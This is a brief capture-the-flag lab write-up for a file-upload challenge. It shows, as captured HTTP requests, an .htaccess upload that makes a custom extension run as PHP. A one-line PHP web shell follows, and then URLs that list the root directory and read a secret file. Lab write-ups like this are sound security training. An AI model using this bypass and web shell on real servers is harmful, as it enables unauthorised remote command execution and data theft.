# Lab Writeup – File Upload 4

## Overview

Platform: CyberJutsu  
Difficulty: Easy

---

![Image](./screenshots/file-upload-4-01.png)

---

## 1. Upload File test.txt and Press submit

![Image](./screenshots/file-upload-4-02.png)

---

## 2. Capture packets in Burp Suite and send an HTTP POST request to upload .htaccess

```
------WebKitFormBoundaryiGKrNDI1sBJzul7b
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: text/plain

<FilesMatch ".+\.tuanloc">
    SetHandler application/x-httpd-php
</FilesMatch>
------WebKitFormBoundaryiGKrNDI1sBJzul7b--
```

![Image](./screenshots/file-upload-4-03.png)

---

## 3. Continue uploading test.tuanloc which is web shell

```
------WebKitFormBoundaryiGKrNDI1sBJzul7b
Content-Disposition: form-data; name="file"; filename="test.tuanloc"
Content-Type: text/plain

<?php system($_GET[x]); ?>
------WebKitFormBoundaryiGKrNDI1sBJzul7b--
```

![Image](./screenshots/file-upload-4-04.png)

---

## 4. Access file test.tuanloc and add parameter for url

```
https://www.../test.tuanloc?x=ls%20-la%20/
```

![Image](./screenshots/file-upload-4-05.png)

---

## 5. Find and Read secret.txt to get FLAG

```
https://www.../test.tuanloc?x=cat%20/fead248f338-secret.txt
```
